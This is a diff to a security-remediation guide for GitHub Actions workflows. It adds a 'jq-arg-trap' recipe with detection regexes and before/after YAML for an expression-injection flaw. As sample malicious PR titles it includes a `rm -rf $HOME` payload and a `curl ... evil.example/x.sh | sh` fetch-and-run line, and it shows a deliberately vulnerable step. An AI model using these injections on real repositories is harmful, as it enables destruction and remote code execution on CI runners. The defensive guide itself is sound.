@@ -2,6 +2,15 @@
 
 One-to-one map from a zizmor `ruleId` to the surgical fix the doctor applies. Findings whose `ruleId` is not in this table are surfaced verbatim with `[NEEDS-HUMAN-REVIEW]` — the doctor never silences the matcher with a suppression comment.
 
+## Table of contents
+
+- [Zizmor recipe table](#zizmor-recipe-table) — one row per upstream zizmor `ruleId`.
+- [Secret handling rule](#secret-handling-rule-applies-to-every-fix-that-introduces-a-secret) — env-var indirection for any secret introduced by a fix.
+- [Janitor-extension recipes (not in zizmor catalogue)](#janitor-extension-recipes-not-in-zizmor-catalogue) — findings the doctor matches itself with regex on every workflow file as a second pass after the zizmor scan.
+  - [`jq-arg-trap`](#jq-arg-trap) — `jq --arg name "${{ ... }}"` shell substitution before jq sees the value.
+
+## Zizmor recipe table
+
 | zizmor audit | Surgical fix |
 |---|---|
 | `unpinned-uses` | Replace `owner/repo@v<X>` or `@<branch>` with `owner/repo@<sha>  # v<X.Y.Z>`. Resolve the SHA via `gh api repos/<owner>/<repo>/commits/<tag> --jq .sha`. Always append a `# v<tag>` comment so future readers can map the SHA back to a version. |
@@ -33,3 +42,71 @@ gh secret set MY_TOKEN --body "$MY_TOKEN" --repo "$(gh repo view --json nameWith
 ```
 
 The value flows through the shell's existing env, not through Claude's prompt, not through argv visible in `ps`, not through hook logs.
+
+## Janitor-extension recipes (not in zizmor catalogue)
+
+The doctor runs a **second pass** after the zizmor scan: for every `.github/workflows/*.yml` file it compiles a small regex set and applies each janitor-specific matcher below. These findings do NOT come from zizmor and do NOT have a zizmor `ruleId` — they are matched and labelled by the doctor itself. Treat them with the same rigor as zizmor findings: no suppression comments, no `[NEEDS-HUMAN-REVIEW]` shortcut when a surgical fix exists.
+
+### `jq-arg-trap`
+
+**Class:** expression injection that bypasses jq's safe-`--arg` form.
+
+**Why zizmor misses it:** zizmor's `template-injection` audit flags any `${{ ... }}` inside a `run:` block, but treats `jq --arg <name> "${{ ... }}"` as a safer pattern in some configurations because the operator visibly opted into `--arg`. The trap is that `--arg` only protects the **jq filter** from injection — it does NOT protect the **shell** from the `${{ }}` substitution that happens BEFORE jq is even invoked. A pull request title of `'; rm -rf $HOME ; '` (or any shell metacharacter payload) still lands in the shell argv unquoted-by-GitHub and the shell happily expands it.
+
+**Detection (the doctor's regex):**
+
+The doctor compiles `r'\$\{\{[^}]+\}\}'` and applies it to every `run:` block. A match counts as `jq-arg-trap` when ALL THREE hold for that single `run:` block:
+
+1. The block contains the substring `jq` (token-bounded, e.g. matched by `\bjq\b`).
+2. The block contains the substring `--arg`.
+3. The regex `\$\{\{[^}]+\}\}` matches at least once inside the block body.
+
+If any of those is missing, the finding is not `jq-arg-trap` (e.g. `jq` without `--arg`, or `--arg` without `${{ }}`, falls to other rules).
+
+**Severity:** MAJOR. The article that motivated this recipe documents real-world shell-injection landing through this exact path.
+
+**Surgical fix:** route the GH expression through an `env:` mapping on the same step, then pass the env var to `--arg <name> "$ENV_VAR"`. The shell now substitutes a value that is **already a string in the process environment**, never a value the YAML parser splices into the command line.
+
+**BEFORE (vulnerable):**
+
+```yaml
+- name: Record PR title in summary.json
+  run: |
+    jq --arg title "${{ github.event.pull_request.title }}" \
+       '.title = $title' \
+       summary.json > summary.tmp && mv summary.tmp summary.json
+```
+
+A PR title of `attack'; curl -fsSL https://evil.example/x.sh | sh; '` is expanded by the shell BEFORE `jq` is launched. `--arg` doesn't help — the damage is already done at shell-substitution time.
+
+**AFTER (safe):**
+
+```yaml
+- name: Record PR title in summary.json
+  env:
+    PR_TITLE: ${{ github.event.pull_request.title }}
+  run: |
+    jq --arg title "$PR_TITLE" \
+       '.title = $title' \
+       summary.json > summary.tmp && mv summary.tmp summary.json
+```
+
+Now the shell substitutes `$PR_TITLE` from the process environment as a single argv element. GitHub Actions has populated `PR_TITLE` as an environment string, NOT as inline YAML splice, so shell metacharacters in the title stay literal. `jq`'s own `--arg` keeps the title safe inside the filter as well — the two layers compose correctly.
+
+**Acceptance criteria** (the doctor re-runs this check after fixing):
+
+- The `run:` block contains NO literal `${{ }}` expression.
+- Every `--arg <name>` is paired with a `"$ENV_VAR"` (double-quoted shell variable), never with a YAML expression splice.
+- The same step has an `env:` mapping whose keys are exactly the env vars referenced by the `run:` block.
+
+**Why `env:` and not `$GITHUB_EVENT_PATH` / `jq < $GITHUB_EVENT_PATH`:** reading from `$GITHUB_EVENT_PATH` is fine too and is sometimes cleaner for multi-field reads, but the surgical-minimum fix for a single field is `env:` because it preserves the original step's intent (a single jq invocation editing a single file) without introducing a new file read.
+
+**Comment requirement:** add an inline YAML comment above the `env:` block:
+
+```yaml
+  # jq-arg-trap fix: route GH expression through env so the shell never sees the raw value.
+  env:
+    PR_TITLE: ${{ github.event.pull_request.title }}
+```
+
+The comment makes future readers (and future automated matchers) aware that this is the documented safe pattern, not an accidental hardcode.
